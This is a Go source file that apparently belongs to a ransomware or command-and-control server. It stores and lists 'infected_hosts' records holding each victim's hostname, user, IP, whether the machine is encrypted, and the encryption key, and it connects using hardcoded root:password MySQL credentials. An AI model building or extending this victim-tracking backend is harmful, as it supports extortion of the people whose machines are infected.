//Manages the DB for device enrolment
//http://go-database-sql.org/importing.html
//cd '/usr' ; /usr/bin/mysqld_safe --datadir='/var/lib/mysql' (sudo -s)
package Webserver

import (
	"database/sql"
	"fmt"
	"log"

	_ "github.com/go-sql-driver/mysql"
)

//Connect to DB and return db instance
func Connect() (*sql.DB, error) {
	db, err := sql.Open("mysql", "root:password@/devices")
	if err != nil {
		return nil, fmt.Errorf("Cannot connect to db: %v", err)
	}
	//do no close connection, as close called by other functions
	log.Println("Initialised connection to DB")
	return db, nil
}

//Inserts device enrolment data into the DB
//https://go.dev/doc/tutorial/database-access
func Insert(db *sql.DB, device Enumeration) error {
	result, err := db.Exec("INSERT INTO `infected_hosts` (`id`, `hostname`, `user`, `ip`, `pwd`, `os`, `encrypted`, `key`) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
		device.ID, device.Hostname, device.User, device.IP, device.Pwd, device.OS, device.Encrypted, device.Key)
	if err != nil {
		return fmt.Errorf("failed inserting data: %v", err)
	}
	rowsAffected, err := result.RowsAffected()
	if err != nil {
		return fmt.Errorf("failed inserting data: %v", err)
	}
	fmt.Printf("device %s created successfully (%d row affected)\n", device.ID, rowsAffected)

	defer db.Close()
	defer log.Printf("Inserted device %s into DB", device.ID)

	return nil
}

//Constructs the struct for display on the /view page
func Query(db *sql.DB) ([]Enumeration, error) {
	var devices []Enumeration
	results, err := db.Query("SELECT `id`, `hostname`, `user`, `ip`, `pwd`, `os`, `encrypted`, `key` FROM infected_hosts")
	if err != nil {
		return nil, fmt.Errorf("could not query db: %v", err)
	}
	//get all values from db
	defer results.Close()
	for results.Next() {
		var device Enumeration
		err = results.Scan(&device.ID, &device.Hostname, &device.User, &device.IP, &device.Pwd, &device.OS, &device.Encrypted, &device.Key)
		if err != nil {
			return nil, fmt.Errorf("Issue querying data from DB", err)
		}
		devices = append(devices, device)
		log.Printf("user queried %s", device.ID)
	}
	defer log.Println("User queried the DB")
	defer db.Close()
	return devices, nil
}

//updates values for devices already enrolled
func Update(device Enumeration) error {

	defer log.Printf("Updated device %s into DB", device.ID) //TODO: Can this be changed to show what was updated

	return nil
}
